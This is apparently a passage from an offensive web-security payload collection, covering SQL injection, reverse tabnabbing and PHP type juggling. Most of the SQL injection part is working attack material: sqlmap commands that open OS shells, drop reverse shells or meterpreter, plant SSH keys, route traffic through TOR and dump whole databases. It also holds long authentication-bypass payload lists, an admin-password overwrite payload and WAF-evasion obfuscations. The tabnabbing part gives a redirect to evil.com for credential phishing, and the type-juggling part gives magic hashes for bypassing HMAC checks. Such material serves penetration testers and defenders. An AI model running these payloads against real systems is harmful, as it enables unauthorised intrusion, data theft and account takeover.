\u0026#34;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\u0026#34;], [\u0026#34;\u0026#39;i\u0026#39;=\u0026#39;i\u0026#39;\u0026#34;, \u0026#34;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\u0026#34;], SQL injection using SQLmap # Basic arguments for SQLmap # sqlmap --url=\u0026#34;\u0026lt;url\u0026gt;\u0026#34; -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs Load a request file and use mobile user-agent # sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1 Custom injection in UserAgent/Header/Referer/Cookie # python sqlmap.py -u \u0026#34;http://example.com\u0026#34; --data \u0026#34;username=admin\u0026amp;password=pass\u0026#34; --headers=\u0026#34;x-forwarded-for:127.0.0.1*\u0026#34; The injection is located at the \u0026#39;*\u0026#39; Second order injection # python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order \u0026#34;http://targetapp/wishlist\u0026#34; -v 3 sqlmap -r 1.txt -dbms MySQL -second-order \u0026#34;http://\u0026lt;IP/domain\u0026gt;/joomla/administrator/index.php\u0026#34; -D \u0026#34;joomla\u0026#34; -dbs Shell # SQL Shell python sqlmap.py -u \u0026#34;http://example.com/?id=1\u0026#34; -p id --sql-shell Simple Shell python sqlmap.py -u \u0026#34;http://example.com/?id=1\u0026#34; -p id --os-shell Dropping a reverse-shell / meterpreter python sqlmap.py -u \u0026#34;http://example.com/?id=1\u0026#34; -p id --os-pwn SSH Shell by dropping an SSH key python sqlmap.py -u \u0026#34;http://example.com/?id=1\u0026#34; -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/ Crawl a website with SQLmap and auto-exploit # sqlmap -u \u0026#34;http://example.com/\u0026#34; --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers --crawl = how deep you want to crawl a site --forms = Parse and test forms Using TOR with SQLmap # sqlmap -u \u0026#34;http://www.target.com\u0026#34; --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5 Using a proxy with SQLmap # sqlmap -u \u0026#34;http://www.target.com\u0026#34; --proxy=\u0026#34;http://127.0.0.1:8080\u0026#34; Using Chrome cookie and a Proxy # sqlmap -u \u0026#34;https://test.com/index.php?id=99\u0026#34; --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy \u0026#34;http://127.0.0.1:8080\u0026#34; -f --time-sec 15 --level 3 Using suffix to tamper the injection # python sqlmap.py -u \u0026#34;http://example.com/?id=1\u0026#34; -p id --suffix=\u0026#34;-- \u0026#34; General tamper option and tamper\u0026rsquo;s list # tamper=name_of_the_tamper | Tamper | Description | | ------------- | ------------- | | 0x2char.py | Replaces each (MySQL) 0x\u0026lt;hex\u0026gt; encoded string with equivalent CONCAT(CHAR(),…) counterpart | | apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart | | apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart | | appendnullbyte.py | Appends encoded NULL byte character at the end of payload | | base64encode.py | Base64 all characters in a given payload | | between.py | Replaces greater than operator (\u0026#39;\u0026gt;\u0026#39;) with \u0026#39;NOT BETWEEN 0 AND #\u0026#39; | | bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator | | chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) | | charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -\u0026gt; %53%45%4C%45%43%54) | | charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -\u0026gt; %u0053%u0045%u004C%u0045%u0043%u0054) | | charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -\u0026gt; \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) | | commalesslimit.py | Replaces instances like \u0026#39;LIMIT M, N\u0026#39; with \u0026#39;LIMIT N OFFSET M\u0026#39; | | commalessmid.py | Replaces instances like \u0026#39;MID(A, B, C)\u0026#39; with \u0026#39;MID(A FROM B FOR C)\u0026#39; | | commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -\u0026gt; /**/() | | concat2concatws.py | Replaces instances like \u0026#39;CONCAT(A, B)\u0026#39; with \u0026#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)\u0026#39; | | charencode.py | Url-encodes all characters in a given payload (not processing already encoded) | | charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) | | equaltolike.py | Replaces all occurrences of operator equal (\u0026#39;=\u0026#39;) with operator \u0026#39;LIKE\u0026#39; | | escapequotes.py | Slash escape quotes (\u0026#39; and \u0026#34;) | | greatest.py | Replaces greater than operator (\u0026#39;\u0026gt;\u0026#39;) with \u0026#39;GREATEST\u0026#39; counterpart | | halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword | | htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -\u0026gt; \u0026amp;#39;) | | ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart | | ifnull2ifisnull.py | Replaces instances like \u0026#39;IFNULL(A, B)\u0026#39; with \u0026#39;IF(ISNULL(A), B, A)\u0026#39; | | informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier | | least.py | Replaces greater than operator (‘\u0026gt;’) with ‘LEAST’ counterpart | | lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -\u0026gt; select) | | modsecurityversioned.py | Embraces complete query with versioned comment | | modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment | | multiplespaces.py | Adds multiple spaces around SQL keywords | | nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\u0026#34;SELECT\u0026#34;, \u0026#34;\u0026#34;)) filters| | overlongutf8.py | Converts all characters in a given payload (not processing already encoded) | | overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -\u0026gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) | | percentage.py | Adds a percentage sign (\u0026#39;%\u0026#39;) infront of each character | | plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart | | plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart | | randomcase.py | Replaces each keyword character with random case value | | randomcomments.py | Add random comments to SQL keywords | | securesphere.py | Appends special crafted string | | sp_password.py | Appends \u0026#39;sp_password\u0026#39; to the end of the payload for automatic obfuscation from DBMS logs | | space2comment.py | Replaces space character (\u0026#39; \u0026#39;) with comments | | space2dash.py | Replaces space character (\u0026#39; \u0026#39;) with a dash comment (\u0026#39;--\u0026#39;) followed by a random string and a new line (\u0026#39;\\n\u0026#39;) | | space2hash.py | Replaces space character (\u0026#39; \u0026#39;) with a pound character (\u0026#39;#\u0026#39;) followed by a random string and a new line (\u0026#39;\\n\u0026#39;) | | space2morehash.py | Replaces space character (\u0026#39; \u0026#39;) with a pound character (\u0026#39;#\u0026#39;) followed by a random string and a new line (\u0026#39;\\n\u0026#39;) | | space2mssqlblank.py | Replaces space character (\u0026#39; \u0026#39;) with a random blank character from a valid set of alternate characters | | space2mssqlhash.py | Replaces space character (\u0026#39; \u0026#39;) with a pound character (\u0026#39;#\u0026#39;) followed by a new line (\u0026#39;\\n\u0026#39;) | | space2mysqlblank.py | Replaces space character (\u0026#39; \u0026#39;) with a random blank character from a valid set of alternate characters | | space2mysqldash.py | Replaces space character (\u0026#39; \u0026#39;) with a dash comment (\u0026#39;--\u0026#39;) followed by a new line (\u0026#39;\\n\u0026#39;) | | space2plus.py | Replaces space character (\u0026#39; \u0026#39;) with plus (\u0026#39;+\u0026#39;) | | space2randomblank.py | Replaces space character (\u0026#39; \u0026#39;) with a random blank character from a valid set of alternate characters | | symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (\u0026amp;\u0026amp; and ||) | | unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT | | unmagicquotes.py | Replaces quote character (\u0026#39;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) | | uppercase.py | Replaces each keyword character with upper case value \u0026#39;INSERT\u0026#39;| | varnish.py | Append a HTTP header \u0026#39;X-originating-IP\u0026#39; | | versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment | | versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment | | xforwardedfor.py | Append a fake HTTP header \u0026#39;X-Forwarded-For\u0026#39; | SQLmap without SQL injection # You can use SQLmap to access a database via its port instead of a URL.\nsqlmap.py -d \u0026#34;mysql://user:pass@ip/database\u0026#34; --dump-all Authentication bypass # \u0026#39;-\u0026#39; \u0026#39; \u0026#39; \u0026#39;\u0026amp;\u0026#39; \u0026#39;^\u0026#39; \u0026#39;*\u0026#39; \u0026#39; or 1=1 limit 1 -- -+ \u0026#39;=\u0026#34;or\u0026#39; \u0026#39; or \u0026#39;\u0026#39;-\u0026#39; \u0026#39; or \u0026#39;\u0026#39; \u0026#39; \u0026#39; or \u0026#39;\u0026#39;\u0026amp;\u0026#39; \u0026#39; or \u0026#39;\u0026#39;^\u0026#39; \u0026#39; or \u0026#39;\u0026#39;*\u0026#39; \u0026#39;-||0\u0026#39; \u0026#34;-||0\u0026#34; \u0026#34;-\u0026#34; \u0026#34; \u0026#34; \u0026#34;\u0026amp;\u0026#34; \u0026#34;^\u0026#34; \u0026#34;*\u0026#34; \u0026#39;--\u0026#39; \u0026#34;--\u0026#34; \u0026#39;--\u0026#39; / \u0026#34;--\u0026#34; \u0026#34; or \u0026#34;\u0026#34;-\u0026#34; \u0026#34; or \u0026#34;\u0026#34; \u0026#34; \u0026#34; or \u0026#34;\u0026#34;\u0026amp;\u0026#34; \u0026#34; or \u0026#34;\u0026#34;^\u0026#34; \u0026#34; or \u0026#34;\u0026#34;*\u0026#34; or true-- \u0026#34; or true-- \u0026#39; or true-- \u0026#34;) or true-- \u0026#39;) or true-- \u0026#39; or \u0026#39;x\u0026#39;=\u0026#39;x \u0026#39;) or (\u0026#39;x\u0026#39;)=(\u0026#39;x \u0026#39;)) or ((\u0026#39;x\u0026#39;))=((\u0026#39;x \u0026#34; or \u0026#34;x\u0026#34;=\u0026#34;x \u0026#34;) or (\u0026#34;x\u0026#34;)=(\u0026#34;x \u0026#34;)) or ((\u0026#34;x\u0026#34;))=((\u0026#34;x or 2 like 2 or 1=1 or 1=1-- or 1=1# or 1=1/* admin\u0026#39; -- admin\u0026#39; -- - admin\u0026#39; # admin\u0026#39;/* admin\u0026#39; or \u0026#39;2\u0026#39; LIKE \u0026#39;1 admin\u0026#39; or 2 LIKE 2-- admin\u0026#39; or 2 LIKE 2# admin\u0026#39;) or 2 LIKE 2# admin\u0026#39;) or 2 LIKE 2-- admin\u0026#39;) or (\u0026#39;2\u0026#39; LIKE \u0026#39;2 admin\u0026#39;) or (\u0026#39;2\u0026#39; LIKE \u0026#39;2\u0026#39;# admin\u0026#39;) or (\u0026#39;2\u0026#39; LIKE \u0026#39;2\u0026#39;/* admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;/* admin\u0026#39;or 1=1 or \u0026#39;\u0026#39;=\u0026#39; admin\u0026#39; or 1=1 admin\u0026#39; or 1=1-- admin\u0026#39; or 1=1# admin\u0026#39; or 1=1/* admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1 admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;/* admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1 admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;/* 1234 \u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055 admin\u0026#34; -- admin\u0026#39;;-- azer admin\u0026#34; # admin\u0026#34;/* admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1 admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;/* admin\u0026#34;or 1=1 or \u0026#34;\u0026#34;=\u0026#34; admin\u0026#34; or 1=1 admin\u0026#34; or 1=1-- admin\u0026#34; or 1=1# admin\u0026#34; or 1=1/* admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1 admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;/* admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1 admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;/* 1234 \u0026#34; AND 1=0 UNION ALL SELECT \u0026#34;admin\u0026#34;, \u0026#34;81dc9bdb52d04dc20036dbd8313ed055 Authentication Bypass (Raw MD5 SHA1) # When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.\n\u0026#34;SELECT * FROM admin WHERE pass = \u0026#39;\u0026#34;.md5($password,true).\u0026#34;\u0026#39;\u0026#34; Allowing an attacker to craft a string with a true statement such as ' or 'SOMETHING\nmd5(\u0026#34;ffifdyop\u0026#34;, true) = \u0026#39;or\u0026#39;6�]��!r,��b\u001c sha1(\u0026#34;3fDf \u0026#34;, true) = Q�u\u0026#39;=\u0026#39;�@�[�t�- o��_-! Challenge demo available at http://web.jarvisoj.com:32772\nPolyglot injection (multicontext) # SLEEP(1) /*\u0026#39; or SLEEP(1) or \u0026#39;\u0026#34; or SLEEP(1) or \u0026#34;*/ /* MySQL only */ IF(SUBSTR(@@version,1,1)\u0026lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\u0026#39;XOR(IF(SUBSTR(@@version,1,1)\u0026lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\u0026#39;|\u0026#34;XOR(IF(SUBSTR(@@version,1,1)\u0026lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\u0026#34;*/ Routed injection # admin\u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; Insert Statement - ON DUPLICATE KEY UPDATE # ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:\nInject using payload: attacker_dummy@example.com\u0026#34;, \u0026#34;bcrypt_hash_of_qwerty\u0026#34;), (\u0026#34;admin@example.com\u0026#34;, \u0026#34;bcrypt_hash_of_qwerty\u0026#34;) ON DUPLICATE KEY UPDATE password=\u0026#34;bcrypt_hash_of_qwerty\u0026#34; -- The query would look like this: INSERT INTO users (email, password) VALUES (\u0026#34;attacker_dummy@example.com\u0026#34;, \u0026#34;bcrypt_hash_of_qwerty\u0026#34;), (\u0026#34;admin@example.com\u0026#34;, \u0026#34;bcrypt_hash_of_qwerty\u0026#34;) ON DUPLICATE KEY UPDATE password=\u0026#34;bcrypt_hash_of_qwerty\u0026#34; -- \u0026#34;, \u0026#34;bcrypt_hash_of_your_password_input\u0026#34;); This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”. Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \u0026#34;bcrypt_hash_of_qwerty\u0026#34;. After this, we can simply authenticate with “admin@example.com” and the password “qwerty”! WAF Bypass # White spaces alternatives # No Space (%20) - bypass using whitespace alternatives\n?id=1%09and%091=1%09-- ?id=1%0Dand%0D1=1%0D-- ?id=1%0Cand%0C1=1%0C-- ?id=1%0Band%0B1=1%0B-- ?id=1%0Aand%0A1=1%0A-- ?id=1%A0and%A01=1%A0-- No Whitespace - bypass using comments\n?id=1/*comment*/and/**/1=1/**/-- No Whitespace - bypass using parenthesis\n?id=(1)and(1)=(1)-- Whitespace alternatives by DBMS | DBMS | ASCII characters in hexadicimal | | ---- | ------------------------------- | | SQLite3 | 0A, 0D, 0C, 09, 20 | | MySQL\t5 | 09, 0A, 0B, 0C, 0D, A0, 20 | | MySQL\t3\t| 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 | | PostgreSQL | 0A, 0D, 0C, 09, 20 | | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 | | MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 | Example of query where spaces were replaced by ascii characters above 0x80\n♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼ No Comma # Bypass using OFFSET, FROM and JOIN\nLIMIT 0,1 -\u0026gt; LIMIT 1 OFFSET 0 SUBSTR(\u0026#39;SQL\u0026#39;,1,1) -\u0026gt; SUBSTR(\u0026#39;SQL\u0026#39; FROM 1 FOR 1). SELECT 1,2,3,4 -\u0026gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d No Equal # Bypass using LIKE/NOT IN/IN/BETWEEN\n?id=1 and substring(version(),1,1)like(5) ?id=1 and substring(version(),1,1)not in(4,3) ?id=1 and substring(version(),1,1)in(4,3) ?id=1 and substring(version(),1,1) between 3 and 4 Case modification # Bypass using uppercase/lowercase (see keyword AND)\n?id=1 AND 1=1# ?id=1 AnD 1=1# ?id=1 aNd 1=1# Bypass using keywords case insensitive / Bypass using an equivalent operator\nAND -\u0026gt; \u0026amp;\u0026amp; OR -\u0026gt; || = -\u0026gt; LIKE,REGEXP, BETWEEN, not \u0026lt; and not \u0026gt; \u0026gt; X -\u0026gt; not between 0 and X WHERE -\u0026gt; HAVING Obfuscation by DBMS # MySQL\n1.UNION\tSELECT\t2\t3.2UNION\tSELECT\t2\t1e0UNION\tSELECT\t2\tSELECT\\N/0.e3UNION\tSELECT\t2\t1e1AND-0.0UNION\tSELECT\t2\t1/*!12345UNION/*!31337SELECT/*!table_name*/\t{ts\t1}UNION\tSELECT.``\t1.e.table_name\tSELECT\t$.``\t1.e.table_name\tSELECT{_\t.``1.e.table_name}\tSELECT\tLightOS\t.\t``1.e.table_name\tLightOS\tSELECT\tinformation_schema 1337.e.tables\t13.37e.table_name\tSELECT\t1\tfrom\tinformation_schema 9.e.table_name MSSQL\n.1UNION\tSELECT\t2\t1.UNION\tSELECT.2alias\t1e0UNION\tSELECT\t2\t1e1AND-1=0.0UNION\tSELECT\t2\tSELECT\t0xUNION\tSELECT\t2\tSELECT\\UNION\tSELECT\t2\t\\1UNION\tSELECT\t2\tSELECT\t1FROM[table]WHERE\\1=\\1AND\\1=\\1\tSELECT\u0026#34;table_name\u0026#34;FROM[information_schema].[tables]\tOracle\n1FUNION\tSELECT\t2\t1DUNION\tSELECT\t2\tSELECT\t0x7461626c655f6e616d65\tFROM\tall_tab_tables SELECT\tCHR(116)\t||\tCHR(97)\t||\tCHR(98)\tFROM\tall_tab_tables SELECT%00table_name%00FROM%00all_tab_tables More MySQL specific # information_schema.tables alternative\nselect * from mysql.innodb_table_stats; +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ | database_name | table_name | last_update | n_rows | clustered_index_size | sum_of_other_index_sizes | +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ | dvwa | guestbook | 2017-01-19 21:02:57 | 0 | 1 | 0 | | dvwa | users | 2017-01-19 21:03:07 | 5 | 1 | 0 | ... +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ mysql\u0026gt; show tables in dvwa; +----------------+ | Tables_in_dvwa | +----------------+ | guestbook | | users | +----------------+ Version Alternative\nmysql\u0026gt; select @@innodb_version; +------------------+ | @@innodb_version | +------------------+ | 5.6.31 | +------------------+ mysql\u0026gt; select @@version; +-------------------------+ | @@version | +-------------------------+ | 5.6.31-0ubuntu0.15.10.1 | +-------------------------+ mysql\u0026gt; mysql\u0026gt; select version(); +-------------------------+ | version() | +-------------------------+ | 5.6.31-0ubuntu0.15.10.1 | +-------------------------+ WAF bypass for MySQL using scientific notation # Blocked\n\u0026#39; or \u0026#39;\u0026#39;=\u0026#39; Working\n\u0026#39; or 1.e(\u0026#39;\u0026#39;)=\u0026#39; Obfuscated query\n1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or\u0026#39;1\u0026#39;=\u0026#39;2 References # Detect SQLi Manual SQL Injection Discovery Tips NetSPI SQL Injection Wiki MySQL: PentestMonkey\u0026rsquo;s mySQL injection cheat sheet Reiners mySQL injection Filter Evasion Cheatsheet Alternative for Information_Schema.Tables in MySQL The SQL Injection Knowledge base MSSQL: EvilSQL\u0026rsquo;s Error/Union/Blind MSSQL Cheatsheet PentestMonkey\u0026rsquo;s MSSQL SQLi injection Cheat Sheet ORACLE: PentestMonkey\u0026rsquo;s Oracle SQLi Cheatsheet POSTGRESQL: PentestMonkey\u0026rsquo;s Postgres SQLi Cheatsheet Others SQLi Cheatsheet - NetSparker Access SQLi Cheatsheet PentestMonkey\u0026rsquo;s Ingres SQL Injection Cheat Sheet Pentestmonkey\u0026rsquo;s DB2 SQL Injection Cheat Sheet Pentestmonkey\u0026rsquo;s Informix SQL Injection Cheat Sheet SQLite3 Injection Cheat sheet Ruby on Rails (Active Record) SQL Injection Guide ForkBombers SQLMap Tamper Scripts Update SQLi in INSERT worse than SELECT Manual SQL Injection Tips Second Order: Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection Exploiting Second Order SQLi Flaws by using Burp \u0026amp; Custom Sqlmap Tamper Sqlmap: #SQLmap protip @zh4ck WAF: SQLi Optimization and Obfuscation Techniques by Roberto Salgado A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection "},{"id":67,"href":"/docs/tabnabbing/","title":"Tabnabbing","section":"Docs","content":" Tabnabbing # Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.\nTools # Discover Reverse Tabnabbing - Burp Extension More information about the vulnerability # When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link\u0026rsquo;s rel attribute does not contain the value noopener and the target attribute contains the value _blank. If this is the case, the website is vulnerable to tabnabbing.\nHow to exploit # 1. Attacker posts a link to a website under his control that contains the following JS code: window.opener.location = \u0026#34;http://evil.com\u0026#34; 2. He tricks the victim into visiting the link, which is opened in the browser in a new tab. 3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website. 4. If the victim opens the background tab again and doesn\u0026#39;t look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example. 5. The victim tries to log on again and the attacker receives the credentials How to hunt for it # As already mentioned, you have to search for the following link formats:\n\u0026lt;a href=\u0026#34;...\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;\u0026#34; /\u0026gt; or \u0026lt;a href=\u0026#34;...\u0026#34; target=\u0026#34;_blank\u0026#34; /\u0026gt; References # Reverse Tabnabbing - OWASP, 20.10.20 Tabnabbing - Wikipedia, 20.10.20 "},{"id":68,"href":"/docs/type_juggling/","title":"Type Juggling","section":"Docs","content":" PHP Juggling type and magic hashes # PHP provides two ways to compare two variables:\nLoose comparison using == or != : both variables have \u0026ldquo;the same value\u0026rdquo;. Strict comparison using === or !== : both variables have \u0026ldquo;the same type and the same value\u0026rdquo;. PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.\nPHP8 won\u0026rsquo;t try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like 0 == strcmp($_GET['username'], $password) bypasses, since strcmp won\u0026rsquo;t return null and spit a warning any longer, but will throw a proper exception instead.\nType Juggling # True statements # var_dump(\u0026#39;0010e2\u0026#39; == \u0026#39;1e3\u0026#39;); # true var_dump(\u0026#39;0xABCdef\u0026#39; == \u0026#39; 0xABCdef\u0026#39;); # true PHP 5.0 / false PHP 7.0 var_dump(\u0026#39;0xABCdef\u0026#39; == \u0026#39; 0xABCdef\u0026#39;); # true PHP 5.0 / false PHP 7.0 var_dump(\u0026#39;0x01\u0026#39; == 1) # true PHP 5.0 / false PHP 7.0 var_dump(\u0026#39;0x1234Ab\u0026#39; == \u0026#39;1193131\u0026#39;); \u0026#39;123\u0026#39; == 123 \u0026#39;123a\u0026#39; == 123 \u0026#39;abc\u0026#39; == 0 \u0026#39;\u0026#39; == 0 == false == NULL \u0026#39;\u0026#39; == 0 # true 0 == false # true false == NULL # true NULL == \u0026#39;\u0026#39; # true NULL statements # var_dump(sha1([])); # NULL var_dump(md5([])); # NULL Example vulnerable code # function validate_cookie($cookie,$key){ $hash = hash_hmac(\u0026#39;md5\u0026#39;, $cookie[\u0026#39;username\u0026#39;] . \u0026#39;|\u0026#39; . $cookie[\u0026#39;$expiration\u0026#39;], $key); if($cookie[\u0026#39;hmac\u0026#39;] != $hash){ // loose comparison return false; ... The $cookie variable is provided by the user. The $key variable is a secret and unknown to the user.\nIf we can make the calculated hash string Zero-like, and provide \u0026ldquo;0\u0026rdquo; in the $cookie['hmac'], the check will pass.\n\u0026#34;0e768261251903820937390661668547\u0026#34; == \u0026#34;0\u0026#34; We have control over 3 elements in the cookie:\n$username - username you are targeting, probably \u0026ldquo;admin\u0026rdquo; $hmac - the provided hash, \u0026ldquo;0\u0026rdquo; $expiration - a UNIX timestamp, must be in the future Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC.\nhash_hmac(admin|1424869663) -\u0026gt; \u0026#34;e716865d1953e310498068ee39922f49\u0026#34; hash_hmac(admin|1424869664) -\u0026gt; \u0026#34;8c9a492d316efb5e358ceefe3829bde4\u0026#34; hash_hmac(admin|1424869665) -\u0026gt; \u0026#34;9f7cdbe744fc2dae1202431c7c66334b\u0026#34; hash_hmac(admin|1424869666) -\u0026gt; \u0026#34;105c0abe89825a14c471d4f0c1cc20ab\u0026#34; ... hash_hmac(admin|1835970773) -\u0026gt; \u0026#34;0e174892301580325162390102935332\u0026#34; // \u0026#34;0e174892301580325162390102935332\u0026#34; == \u0026#34;0\u0026#34; Magic Hashes - Exploit # If the hash computed starts with \u0026ldquo;0e\u0026rdquo; (or \u0026ldquo;0..0e\u0026rdquo;) only followed by numbers, PHP will treat the hash as a float.\nHash \u0026ldquo;Magic\u0026rdquo; Number / String Magic Hash Found By / Description MD4 gH0nAdHk 0e096229559581069251163783434175 @spaze MD4 IiF+hTai 00e90130237707355082822449868597 @spaze MD5 240610708 0e462097431906509019562988736854 @spazef0rze MD5 QNKCDZO 0e830400451993494058024219903391 @spazef0rze MD5 0e1137126905 0e291659922323405260514745084877 @spazef0rze MD5 0e215962017 0e291242476940776845150308577824 @spazef0rze MD5 129581926211651571912466741651878684928 06da5430449f8f6f23dfc1276f722738 Raw: ?T0D??o#??\u0026lsquo;or'8.N=? SHA1 10932435112 0e07766915004133176347055865026311692244 Independently found by Michael A. Cleverly \u0026amp; Michele Spagnuolo \u0026amp; Rogdham SHA-224 10885164793773 0e281250946775200129471613219196999537878926740638594636 @TihanyiNorbert SHA-256 34250003024812 0e46289032038065916139621039085883773413820991920706299695051332 @TihanyiNorbert SHA-256 TyNOQHUS 0e66298694359207596086558843543959518835691168370379069085300385 @Chick3nman512 \u0026lt;?php var_dump(md5(\u0026#39;240610708\u0026#39;) == md5(\u0026#39;QNKCDZO\u0026#39;)); # bool(true) var_dump(md5(\u0026#39;aabg7XSs\u0026#39;) == md5(\u0026#39;aabC9RqS\u0026#39;)); var_dump(sha1(\u0026#39;aaroZmOk\u0026#39;) == sha1(\u0026#39;aaK1STfY\u0026#39;)); var_dump(sha1(\u0026#39;aaO8zKZF\u0026#39;) == sha1(\u0026#39;aa3OFF9m\u0026#39;)); 